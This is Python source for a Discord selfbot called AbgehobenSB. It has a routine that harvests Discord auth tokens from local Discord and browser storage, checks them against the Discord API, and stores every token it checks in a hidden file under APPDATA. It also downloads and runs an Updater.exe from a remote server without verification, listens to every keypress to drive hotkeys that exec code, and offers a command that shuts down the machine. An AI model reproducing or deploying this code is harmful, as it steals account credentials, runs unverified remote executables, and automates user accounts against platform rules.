#Imports
from asyncio.tasks import sleep, wait
from colorama.ansi import clear_screen
import discord, json, ctypes, os, random, asyncio, requests, aiohttp, asyncio, time, datetime, re, httpx, contextlib, base64, urllib, urllib.request, sys, cursor, threading, dateutil.parser
from discord import channel
import PIL

from discord import guild
from discord.ext import commands
import json
import os
import asyncio
from faker import Faker
from discord import Webhook, AsyncWebhookAdapter, Spotify
import ctypes
from pynput.keyboard import Listener
from win32gui import GetWindowText, GetForegroundWindow
from art import *
from colorama import Fore, Back, Style
from colorama import init
import random
import io
import chat_exporter
import requests
import threading
import subprocess
from win10toast_click import ToastNotifier
import os
import asyncio
import colorama
from art import *
import random
import string
import sys
import time
import psutil
import getpass
import base64
import urllib
import re
import cursor

from datetime import datetime
os.system("cls")
motd = requests.get('https://abgehoben.one/SB/motd.php')
class color:
    black = "\u001b[0m"+"\u001b[30m"
    gray = "\u001b[0m"+"\u001b[38;5;244m"
    darkgray = "\u001b[0m"+"\u001b[38;5;237m"
    red = "\u001b[0m"+"\u001b[31m"
    green = "\u001b[0m"+"\u001b[38;5;46m"
    yellow = "\u001b[0m"+"\u001b[38;5;226m"
    blue = "\u001b[0m"+"\u001b[38;5;26m"
    blue1 = "\u001b[0m"+"\u001b[38;5;69m"
    magenta = "\u001b[0m"+"\u001b[35m"
    cyan = "\u001b[0m"+"\u001b[36m"
    white = "\u001b[0m"+"\u001b[37m"
    reset = "\u001b[0m"+"\u001b[0m"

    class bright:
        black = "\u001b[30;1m"
        red = "\u001b[38;5;9m"
        blue = "\u001b[38;5;26m"
        yellow = "\u001b[33;1m"
        blue = "\u001b[34;1m"
        magenta = "\u001b[35;1m"
        cyan = "\u001b[36;1m"
        white = "\u001b[37;1m"
if os.name == "nt":
    class hotkeylogger(threading.Thread):

        def __init__(self, function_that_downloads):
            threading.Thread.__init__(self)
            self.runnable = function_that_downloads
            self.daemon = True

        def run(self):
            self.runnable()

    def keypress():
        def on_press(key):
            try:
                global customcommandtochannel, customcommandtoexecute, customcommandsendcommand, lastmessagesfromuser
                validactions = {"reload": "os.execv(sys.executable, ['python'] + sys.argv)","close": "os._exit(0)", "deletelastmessage": "global deletelatestmessage; deletelatestmessage = True"}
                for i in json.load(open('Files/hotkeys.json')):
                    if "key." in str(key).lower():
                        if str(key.name).lower() == str(i).lower():
                            try:
                                action = json.load(open('Files/hotkeys.json'))[str(key.name)]["action"]
                                hotkeytype = "action"
                            except:
                                command = json.load(open('Files/hotkeys.json'))[str(key.name)]["command"]
                                hotkeytype = "command"
                            if "discord" in str(GetWindowText(GetForegroundWindow())).lower():
                                if hotkeytype == "command":
                                    customcommandtochannel = str(open("./Files/Cache/sendcommandin.txt").read())
                                    customcommandtoexecute = command
                                    customcommandsendcommand = True
                                else:
                                    for i in validactions:
                                        if str(action) == str(i):
                                            print (f" {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] {theme.color1}[{color.gray}HOTKEY{theme.color1}]{theme.color2} Executed action{theme.color1} {str(i)}{theme.color2}")
                                            exec(validactions[i])
                            else:
                                print (f" {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] {theme.color1}[{color.gray}HOTKEY{theme.color1}]{color.bright.red} Discord {theme.color2}is not in Focus.")
                    else:
                        keypressed = str(key).replace("'", "").lower()
                        if keypressed == str(i).lower():
                            try:
                                action = json.load(open('Files/hotkeys.json'))[str(keypressed)]["action"]
                                hotkeytype = "action"
                            except:
                                command = json.load(open('Files/hotkeys.json'))[str(keypressed)]["command"]
                                hotkeytype = "command"
                            if "discord" in str(GetWindowText(GetForegroundWindow())).lower():
                                if hotkeytype == "command":
                                    customcommandtochannel = str(open("./Files/Cache/sendcommandin.txt").read())
                                    customcommandtoexecute = command
                                    customcommandsendcommand = True
                                else:
                                    for i in validactions:
                                        if str(action) == str(i):
                                            exec(validactions[i])
                                            print (f" {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] {theme.color1}[{color.gray}HOTKEY{theme.color1}]{theme.color2} Executed action{theme.color1} {str(i)}{theme.color2}")
                            else:
                                print (f" {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] {theme.color1}[{color.gray}HOTKEY{theme.color1}]{color.bright.red} Discord {theme.color2}is not in Focus")
            except:
                pass

        def on_release(key):
            None

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

class theme:
    logomaincolor = color.blue1
    logoshadowcolor = color.blue1
    color1 = color.blue1
    color2 = color.bright.white
    color3 = color.darkgray

def showphonenotifier(title, description, information):
    try:
        phonetoastsend = requests.get(f"{json.load(open('./Files/config.json'))['ifttt_phone_notification']['ifttt_url']}", json={"value1": title, "value2": description, "value3": information})
        phonetoastsend.close()
    except:
        None
#Version
class version():
    version = "1.8"
    Dev = "Wʜʏ Sᴏ Sᴇʀɪᴏᴜs and LeQuit"
def plaintextgen(embed: discord.Embed):
    if not embed.image:
        code_block_builder = """```ini
{}{}{}{}{}
```""".format(f"= {embed.author.name} =" + "\n\n" if embed.author.name and embed.author.name != "" else "", f"[ {embed.title.replace('*', '').upper()} ]" + "\n\n", embed.description.replace('*', '').replace('`', '') + "\n" if embed.description else "", """\n""".join([f"| [ {field.name.replace('__', '')} ]" + "\n" + f"{field.value.replace('*', '').replace('`', '')}" + "\n" for field in embed.fields]) if embed.fields else "", "\n; " + embed.footer.text if embed.footer.text else "")
        return code_block_builder
    else:
        return embed.image.url
async def send_message_in_mode(ctx, embed):
    if json.load(open('./Files/config.json'))['plaintextmode']:
        await ctx.send(plaintextgen(embed), delete_after = json.load(open('./Files/config.json'))['delete_bot_response_after'])
    else:
        await ctx.send(embed=embed, delete_after = json.load(open('./Files/config.json'))['delete_bot_response_after'])
def mainterm():
    cursor.hide()
    ctypes.windll.kernel32.SetConsoleTitleW(f"AbgehobenSB {version.version}  |  {motd.text}")
    print(Fore.LIGHTBLUE_EX)
    tprint("AbgehobenSB")
    print(Fore.RESET)
    print(Fore.BLUE + f''.center(86, "═"))


def FindTokens():
    if os.name == "nt":
        try:
            foundaccounts = []
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord": ROAMING + "\\Discord",
                "Discord Canary": ROAMING + "\\discordcanary",
                "Discord PTB": ROAMING + "\\discordptb",
                'Discord Development': ROAMING + '\\discorddevelopment',
                "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
                "Opera": ROAMING + "\\Opera Software\\Opera Stable",
                #"Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
            }

            def getHeader(logintoken=None, content_type="application/json"):
                header = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
                }
                if logintoken:
                    header.update({"Authorization": logintoken})
                return header

            def getUserData(logintoken):
                try:
                    return json.loads(
                        urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v8/users/@me", headers=getHeader(logintoken))).read().decode()
                    )
                except:
                    pass

            def getTokens(path):
                path += "\\Local Storage\\leveldb"
                tokens = []
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for logintoken in re.findall(regex, line):
                                tokens.append(logintoken)
                return tokens

            cache_path = ROAMING + "\\.cache~$"
            embeds = []
            working = []
            checked = []
            already_cached_tokens = []
            working_ids = []
            for platform, path in PATHS.items():
                if not os.path.exists(path):
                    continue
                for logintoken in getTokens(path):
                    if logintoken in checked:
                        continue
                    checked.append(logintoken)
                    uid = None
                    if not logintoken.startswith("mfa."):
                        try:
                            uid = base64.b64decode(logintoken.split(".")[0].encode()).decode()
                        except:
                            pass
                        if not uid or uid in working_ids:
                            continue
                    user_data = getUserData(logintoken)
                    if not user_data:
                        continue
                    working_ids.append(uid)
                    working.append(logintoken)
                    username = user_data["username"] + theme.color3 +"#" + str(user_data["discriminator"])
                    user_id = user_data["id"]
                    user_email = user_data["email"]

                    foundaccounts.append({f"{username} {theme.color1}[{theme.color2}{user_id}{theme.color1}] {theme.color1}[{theme.color2}{user_email}{theme.color1}]": f"{logintoken}"})

            names = []
            foundtokens = []

            if len(foundaccounts) > 0:
                for foundaccount in foundaccounts:
                    for name in foundaccount.keys():
                        names.append(name)
                    for foundtoken in foundaccount.values():
                        foundtokens.append(foundtoken)

                for i, yes in enumerate(foundtokens):
                    print(f"{theme.color2}    {i} {theme.color1}| {theme.color2}{names[i]}")

                print("\n")


                try:
                    cursor.show()
                    print(theme.color1 + "Select the account you want to use".center(86, " "))
                    print(theme.color1 + "Don't leave it blank".center(86, " "))
                    foundaccount = int(input(f"\n{theme.color3}                             > {theme.color2}"))
                    cursor.hide()
                    token = foundtokens[foundaccount]
                    with open("Files/config.json", "r", encoding="utf-8") as jsonFile:
                        data = json.load(jsonFile)

                    data['token'] = token

                    with open("Files/config.json", "w", encoding="utf-8") as jsonFile:
                        json.dump(data, jsonFile, indent=4, sort_keys=False)
                except ValueError:
                    mainterm()
                    print()
                    print(theme.color1 + "Type in your Discord token".center(86, " "))
                    print()
                    cursor.show()
                    choice_token = input(f"{theme.color3}                              > {color.black}")
                    cursor.hide()

                    with open("Files/config.json", "r", encoding="utf-8") as jsonFile:
                        data = json.load(jsonFile)

                    data['token'] = choice_token

                    with open("Files/config.json", "w", encoding="utf-8") as jsonFile:
                        json.dump(data, jsonFile, indent=4, sort_keys=False)


                with open(cache_path, "a") as file:
                    for logintoken in checked:
                        if not logintoken in already_cached_tokens:
                            file.write(logintoken + "\n")
            else:
                mainterm()
                print()
                print(theme.color1 + "Type in your Discord token".center(86, " "))
                print()
                cursor.show()
                choice_token = input(f"{theme.color3}                              > {color.black}")
                cursor.hide()

                with open("Files/config.json", "r", encoding="utf-8") as jsonFile:
                    data = json.load(jsonFile)

                data['token'] = choice_token

                with open("Files/config.json", "w", encoding="utf-8") as jsonFile:
                    json.dump(data, jsonFile, indent=4, sort_keys=False)

        except Exception:
            pass
    else:
        mainterm()
        print()
        print(theme.color1 + "Type in your Discord token".center(86, " "))
        print()
        cursor.show()
        choice_token = input(f"{theme.color3}                              > {color.black}")
        cursor.hide()

        with open("Files/config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)

        data['token'] = choice_token

        with open("Files/config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)

try:
    if not os.path.exists("./Files/Animatedtext/"):
        os.makedirs("./Files/Animatedtext/")
    if not os.path.exists("./Files/Cache/"):
        os.makedirs("./Files/Cache/")
    if not os.path.exists("./Files/Extensions/"):
        os.makedirs("./Files/Extensions/")
        with open('./Files/Extensions/Example.py', 'w') as f:
            f.write('''
# You can create as much .py files as you want.

# Don't forget to put always self on the first place. example:
# @Abgehoben.command()
# async def yourcommand(self, ctx):

@Abgehoben.command(brief="example <message>")
async def example(self, ctx, message: str="example"):
    """This is a Example command."""
    await ctx.send("This is " + message)''')
    if not os.path.exists("./Files/config.json"):
        with open(r'./Files/config.json', 'w+') as outfile:
            config = '''{
    "prefix": "none",
    "token": "none",
    "plaintextmode": false,
    "selected_theme": "Default",
    "delete_message": true,
    "delete_bot_response_after": 15,
    "log_command_on_execute": true,
    "ifttt_phone_notification": {
        "ifttt_url": "none"
    },
    "ghostping_log": {
        "ghostping_log": true,
        "ghostping_webhook": "none",
        "ghostping_toast": false,
        "ifttt_notification": false
    },
    "nitro_sniper": {
        "nitro_sniper": false,
        "nitro_sniper_webhook": "none",
        "nitro_sniper_toast": true,
        "ifttt_notification": false,
        "nitro_sniper_log_already_redeemed_code": true,
        "nitro_sniper_log_fake_code": true
    },
    "afk_auto_response": {
        "afk_auto_response": false,
        "afk_auto_response_delay": 10,
        "afk_auto_response_message": "Im currently not available.",
        "ifttt_notification": false
    },
    "dm_typing_logger": {
        "dm_typing_logger": true,
        "dm_typing_logger_toast": true,
        "ifttt_notification": false
    }
}'''
            outfile.write(config)

    

    if not os.path.exists("./Themes/"):
        os.mkdir("Themes")
    if not os.path.exists("./Themes/Default.json"):
        with open('./Themes/Default.json', 'w') as f:
            f.write('''{
            "embed_title": "AbgehobenSB",
            "embed_thumbnail": "https://cdn.discordapp.com/attachments/793401060864819220/864932966887325696/unknown.png",
            "embed_color": "#0BADE2",
            "embed_footer": "Get Abgehoben, get High.",
            "embed_footer_icon": "https://cdn.discordapp.com/attachments/793401060864819220/864932966887325696/unknown.png"
}''')
    if not os.path.exists("./Files/hotkeys.json"):
        with open('./Files/hotkeys.json', 'w') as f:
            f.write('''{
  "f5": {
    "command": "help"
  },
  "f4": {
    "action": "deletelastmessage"
  },
  "f3": {
    "action": "reload"
  },
  "f2": {
    "action": "close"
  }
}''')
except:
    pass
if not os.path.exists("./Files/Icon.ico"):
        r = requests.get("https://cdn.discordapp.com/attachments/776881371116601345/864972907989958656/Icon.ico", allow_redirects=True)
        open("./Files/Icon.ico", "wb").write(r.content)
if not os.path.exists("./Files/users.txt"):
        r = requests.get("https://abgehoben.one/users.txt", allow_redirects=True)
        open("./Files/users.txt", "wb").write(r.content)
#Loading
def spin():
    print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Loading {theme.color1}AbgehobenSB {theme.color2}extensions.")
    sys.stdout.flush()
    time.sleep(0.2)
    ctypes.windll.kernel32.SetConsoleTitleW(f"AbgehobenSB {version.version}")
def checkforupdate():
    update = requests.get('https://abgehoben.one/SB/version.php')
    if update.text != version.version:
        print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}UPDATE{theme.color1}]{theme.color2} Update Version {update.text} {theme.color1}available {theme.color2}downloading the Update. Please wait")
        updaterurl = 'https://abgehoben.one/Updater.exe'
        updater = requests.get(updaterurl, allow_redirects=True)
        open(f'Updater.exe', 'wb').write(updater.content)
        time.sleep(0.9)
        subprocess.call(["Updater.exe"])
        sys.exit(2)
    else:
        None

#config loading
with open("Files/config.json") as f:
    config = json.load(f)
    lastmessagesfromuser = []
#Config
class config:
    prefix = None
    token = None
class variables:
    loadedcustomextensions = 0
def loadvariables():
    try:
        config.prefix = json.load(open('Files/config.json'))['prefix']
        config.token = json.load(open('Files/config.json'))['token']
        

    except:
        mainterm()
        cursor.hide()
        print (f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.bright.red}ERROR{theme.color1}]{theme.color2} Please Delete your {theme.color1}Config{theme.color2} file and restart the Bot.")
        time.sleep(5)
        os._exit(0)
loadvariables()
if config.token == "none":
    mainterm()
    print()
    FindTokens()
if config.prefix == "none":
    print(Fore.LIGHTBLUE_EX)
    tprint("AbgehobenSB")
    print(Fore.RESET)
    print(theme.logomaincolor + f''.center(86, "═"))
    print()
    print(theme.color1 + "Type in the Prefix you want to use".center(86, " "))
    print()
    cursor.show()
    choice_prefix = input(f"{theme.color3}                          > {theme.color2}")
    cursor.hide()

    with open("Files/config.json", "r", encoding="utf-8") as jsonFile:
        data = json.load(jsonFile)

    data['prefix'] = choice_prefix

    with open("Files/config.json", "w", encoding="utf-8") as jsonFile:
        json.dump(data, jsonFile, indent=4, sort_keys=False)
loadvariables()
#Other
intents = discord.Intents.all()
client = commands.Bot(command_prefix = config.prefix, self_bot = True, intents=discord.Intents().all())
Abgehoben = commands
newcog = commands.Bot
line = "__________________________________________________________________________"
space = "\n"

init()
checkforupdate()
spin()

class discordinformation:
    totalguildsin = requests.get('https://discordapp.com/api/v9/users/@me/guilds', headers={'authorization': config.token, 'user-agent': 'Mozilla/5.0'}).json()
    totalfriends = requests.get('https://discordapp.com/api/v9/users/@me/relationships', headers={'authorization': config.token, 'user-agent': 'Mozilla/5.0'}).json()
    discordusernamefromuser = None
    discorddiscriminatorfromuser = None
    discordidfromuser = None
    discordnitrotype = None
    try:
        discordinformationrequest = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers={'authorization': config.token, 'user-agent': 'Mozilla/5.0'})
        discordinformationrequest2 = json.loads(discordinformationrequest.content)
    except:
        pass
    try:
        discordusernamefromuser = discordinformationrequest2['username']
        discorddiscriminatorfromuser = discordinformationrequest2['discriminator']
        discordidfromuser = discordinformationrequest2['id']
    except:
        discordinformationrequest2 = "Undefinied"
        discorddiscriminator = "Undefinied"
        discordidfromuser = "Undefinied"
    try:
        if discordinformationrequest2['premium_type'] == 1:
            discordnitrotype = "CLASSIC"
        if discordinformationrequest2['premium_type'] == 2:
            discordnitrotype = "BOOST"
    except:
        discordnitrotype = "NONE"
def showtoastnotifier(description):
    if os.name == "nt":
        ToastNotifier().show_toast("Abgehoben Notification",description,icon_path="./Files/Icon.ico",duration=5,threaded=True)


def start():
    cursor.hide()
    ctypes.windll.kernel32.SetConsoleTitleW(f"AbgehobenSB {version.version}  | {motd.text} {discordinformation.discordusernamefromuser}#{discordinformation.discorddiscriminatorfromuser}  |  Guilds: {len(discordinformation.totalguildsin)}  |  Friends: {len(discordinformation.totalfriends)}")
    print(Fore.LIGHTBLUE_EX)
    tprint("                           Abgehoben"+ space)
    print(f"                          {theme.color1}{theme.color3} {theme.color1} {Fore.GREEN}Prefix{theme.color1}{theme.color2} -> {theme.color1}{config.prefix} {theme.color2} \n")
    print(f"                          {theme.color1}{theme.color3} {theme.color1} {Fore.LIGHTCYAN_EX}Motd{theme.color1}{theme.color2} -> {theme.color1}{motd.text} {theme.color2}")
    print(f"                          {theme.color1}{theme.color3} {theme.color1} {Fore.YELLOW}Dev{theme.color1}{theme.color2} -> {theme.color1}{version.Dev} {theme.color2}\n")
    print(f"                          {theme.color1}{theme.color3} {theme.color1} {Fore.LIGHTGREEN_EX}Name{theme.color1}{theme.color2} -> {theme.color1}{discordinformation.discordusernamefromuser} {theme.color2}\n")
    print(f"                          {theme.color1}{theme.color3} {theme.color1} {Fore.LIGHTBLACK_EX}Version{theme.color1}{theme.color2} -> {theme.color1}{version.version} {theme.color2}")
    print(Fore.RESET)
    print(f''.center(120, "═"))
#Commands/Events

@client.event
async def on_ready():
    ctypes.windll.kernel32.SetConsoleTitleW(f"AbgehobenSB {version.version}  | {discordinformation.discordusernamefromuser}#{discordinformation.discorddiscriminatorfromuser}  |  Guilds: {len(discordinformation.totalguildsin)}  |  Friends: {len(discordinformation.totalfriends)}")
    os.system("cls")
    showtoastnotifier("Abgehoben is ready!")
    start()
    

    
@client.event
async def on_message(msg):
    global lastmessagesfromuser
    
    
    if client.user.id == msg.author.id:
        with open('./Files/Cache/sendcommandin.txt', 'w') as f:
            f.write(str(msg.channel.id))
            f.close()
        lastmessagesfromuser.append(str(msg.channel.id)+":"+str(msg.id))

    if client.user.id != msg.author.id:
        if client.user.mentioned_in(msg) and json.load(open('./Files/config.json'))['afk_auto_response']['afk_auto_response']:
            await asyncio.sleep(json.load(open('./Files/config.json'))['afk_auto_response']['afk_auto_response_delay'])
            if json.load(open('./Files/config.json'))['afk_auto_response']['ifttt_notification']:
                showphonenotifier("AFK respond", "You responded to a Message", f"User: {msg.author}\nGuild: {msg.guild}\nChannel: #{msg.channel}")
            try:
                await msg.channel.send(json.load(open('./Files/config.json'))['afk_auto_response']['afk_auto_response_message'])
                print (f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}]{theme.color2} Responded with AFK message in {theme.color1}{msg.guild}{theme.color2}, {theme.color1}#{msg.channel}")
            except:
                pass
   


    await client.process_commands(msg)    
@client.event
async def on_message_delete(msg):
    if msg.author.id != client.user.id:
        if client.user.mentioned_in(msg) and json.load(open('./Files/config.json'))['ghostping_log']['ghostping_log']:
            contenttemp=str(msg.content).replace(f"<@!{discordinformation.discordidfromuser}>", color.cyan+f"@{discordinformation.discordusernamefromuser}"+theme.color1)
            print(f"\n {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Ghostpinged by {theme.color1}{msg.author} {theme.color2}in {theme.color1}{msg.guild}{theme.color2}, {theme.color1}#{msg.channel}")
            if msg.content != "":
                print(f" {theme.color3}- {theme.color2}Content {theme.color1}{msg.content}\n")
            else:
                print(f" {theme.color3}- {theme.color2}Content {theme.color1}Couldn't load Content.\n")
            if json.load(open('./Files/config.json'))['ghostping_log']['ghostping_toast']:
                showtoastnotifier(f"Ghostpinged by {msg.author}.")

            if json.load(open('./Files/config.json'))['ghostping_log']['ifttt_notification']:
                showphonenotifier("Ghostping", "You got Ghostpinged", f"User: {msg.author}\nGuild: {msg.guild}\nChannel: #{msg.channel}")

            if json.load(open('./Files/config.json'))['ghostping_log']['ghostping_webhook'] != "none":
                try:
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(json.load(open('./Files/config.json'))['ghostping_log']['ghostping_webhook'], adapter=AsyncWebhookAdapter(session))
                        embed = discord.Embed(title="Ghostpinged", description="You got Ghostpinged, More information below!", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))

                        embed.add_field(name="User", value=f"```{msg.author}```")
                        embed.add_field(name="Guild", value=f"```{msg.guild}```")
                        embed.add_field(name="Channel", value=f"```#{msg.channel}```")
                        if msg.content != "":
                            embed.add_field(name="Content", value=msg.content, inline=True)
                        else:
                            embed.add_field(name="Content", value="Couldn't load Content.", inline=True)
                        embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                        embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])


                        await webhook.send(embed=embed)
                except:
                    pass
colour =  json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color']
@client.event
async def on_command(ctx):
    if json.load(open('./Files/config.json'))['log_command_on_execute']:
        print (f" {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}] [{color.gray}LOG{theme.color1}]{theme.color2} Executed {theme.color1}{str(ctx.command)}")
#Passwordgen
currentusername=None
@client.event
async def on_typing(channel, user, when):
    global currentusername
    if isinstance(channel, discord.channel.DMChannel):
        if json.load(open('./Files/config.json'))['dm_typing_logger']['dm_typing_logger']:
            if currentusername != user:
                currentusername = user
                print (f" {theme.color1}[{theme.color3}" + datetime.now().strftime("%H:%M:%S") + f"{theme.color1}]{theme.color1} {user} {theme.color2}is typing in DM's.\n")
                if json.load(open('./Files/config.json'))['dm_typing_logger']['dm_typing_logger_toast']:
                    showtoastnotifier(f"{user} is typing in your DM's.")
                if json.load(open('./Files/config.json'))['afk_auto_response']['ifttt_notification']:
                    showphonenotifier("DM typing", f"{user} is typing in DM's.", None)


client.remove_command("help")



@client.command()
async def bong(ctx):
    
    await ctx.message.delete()
    nice = "``` nice one smoked!```"
    new2 = """```
     |oo|
     |==|
     |__|
   ,'____',
 /"________"\
/____________\
    ```"""
    new3 = """```
     |==|  / /
     |oo| / /
     |oo|/ /
     |==/ /
     |='./
     |oo|
     |==|
     |__|
   ,'____',
 /"________"\
/____________\
           ```"""
    new4 = """```
  .,;
  ';,.'      ';.,'
          ;,.;'

      ;.,:   '.,;,
   ',.  .',;;.',;
 ____________
 \oooooooooo/
  \________/
  {________}
   \______/
    ',__,'
     |oo|
     |oo|    _____
     |==|   / ___()
     |==|  / /
     |oo| / /
     |oo|/ /
     |==/ /
     |='./
     |oo|
     |==|
     |__|
   ,'____',
 /"________"\
/____________\
    ```"""
    msg = await ctx.send("""```
   ,'____',
 /"________"\
/____________\
    ```""")
    await asyncio.sleep(2)
    await msg.edit(content=new2)
    await asyncio.sleep(2)
    await msg.edit(content=new3)
    await asyncio.sleep(2)
    await msg.edit(content=new4)
    await asyncio.sleep(2)
    await msg.edit(content=nice)



@client.command()
async def shutdown(ctx):
     try:
         os.system("shutdown /s /t 1")
     except:
         cmdCommand = "shutdown -s" 
         process = subprocess.Popen(cmdCommand.split(), stdout=subprocess.PIPE)
         process()
    
class user(commands.Cog):
    """User commands;This commands will not need any special permissions."""
    def __init__(self, client):
      self.client = client

    @commands.command(brief="help (category)")
    async def help(self, ctx, *cog):
        """Shows a list of all Categorys and Commands."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        foundedcommands = ''
        if not cog:
            embed=discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"*{config.prefix}help (category) | <> - Important | () - Optional*", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])

            cogs_desc = ''
            for x in client.cogs:
                if json.load(open('./Files/config.json'))['plaintextmode']:
                    cogs_desc += (f'[ {config.prefix}help {x} ] » ;{str(client.cogs[x].__doc__).split(";", 1)[0]}\n')
                else:
                    cogs_desc += (f'**{config.prefix}help {x}** » *{str(client.cogs[x].__doc__).split(";", 1)[0]}*\n')
            if json.load(open('./Files/config.json'))['plaintextmode']:
                embed.add_field(name='Categorys',value=f"[ {config.prefix}about <command> ] » ;Information about a command\n"+cogs_desc[0:len(cogs_desc)-1]+f"\n[ {config.prefix}searchcommand <keyword> ] » ;Information about a command",inline=True)
            else:
                embed.add_field(name='Categorys',value=f"**{config.prefix}about <command>** » *Information about a command*\n"+cogs_desc[0:len(cogs_desc)-1]+f"\n**{config.prefix}searchcommand <keyword>** » *Information about a command*",inline=True)
            cmds_desc = ''
            await send_message_in_mode(ctx, embed)
        else:
            if len(cog) > 1:
                await ctx.send(f"⚠️ Something went wrong.", delete_after=2)
            else:
                found = False
                for x in client.cogs:
                    for y in cog:
                        if x == y:
                            if json.load(open('./Files/config.json'))['plaintextmode']:
                                embed=discord.Embed(title=cog[0].upper()+' COMMANDS',description="```;"+str(self.client.cogs[cog[0]].__doc__).split(";")[1]+"```"+f"\n```{config.prefix}about <command> | <> - Important | () - Optional```", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                            else:
                                embed=discord.Embed(title=cog[0].upper()+' COMMANDS',description="```"+str(self.client.cogs[cog[0]].__doc__).split(";")[1]+"```"+f"\n```{config.prefix}about <command> | <> - Important | () - Optional```", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
                            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
                            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
                            for c in self.client.get_cog(y).get_commands():
                                if not c.hidden:
                                    if json.load(open('./Files/config.json'))['plaintextmode']:
                                        foundedcommands += (f'[ {config.prefix}{c.brief} ] » ;{c.help}\n')
                                    else:
                                        foundedcommands += (f'**{config.prefix}{c.brief}** » *{c.help}*\n')
                            embed.add_field(name='Commands',value=foundedcommands,inline=True)
                            found = True
                if not found:
                    await ctx.send(f"⚠️ There is not Category named `"+cog[0]+"`.", delete_after=2)
                    return
                else:
                    None
                try:
                    await send_message_in_mode(ctx, embed)
                except:
                    pass

    @Abgehoben.command(brief="about <command>")
    async def about(self, ctx, *, name):
        """Shows information about a Command."""
        if json.load(open('./Files/config.json'))['delete_message']:
            try:
                await ctx.message.delete()
            except:
                pass
        command = client.get_command(f"{name.lower()}")
        if command != None:
            embed = discord.Embed(title=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_title'], description=f"Informations about `{command.name}`.", color=int(json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_color'].replace('#', '0x'), 0))
            embed.add_field(name='Command',value=f"`{command.name}`",inline=True)
            embed.add_field(name='Category',value=f"`{command.cog_name}`",inline=True)
            embed.add_field(name='Syntax',value=f"``{config.prefix}{command.brief}``",inline=True)
            embed.add_field(name='Description',value=f"`{command.help}`",inline=False)

            embed.set_thumbnail(url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_thumbnail'])
            embed.set_footer(text=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer'], icon_url=json.load(open(f"Themes/{json.load(open('./Files/config.json'))['selected_theme']}.json"))['embed_footer_icon'])
            await send_message_in_mode(ctx, embed)
        else:
            await ctx.send(f"⚠️ Couldn't find a command named `{name}`", delete_after=2)

    @Abgehoben.command(brief="searchcommand <keyword>")
    async def searchcommand(self, ctx, *, keyword):
        """Seach a command with Key words."""
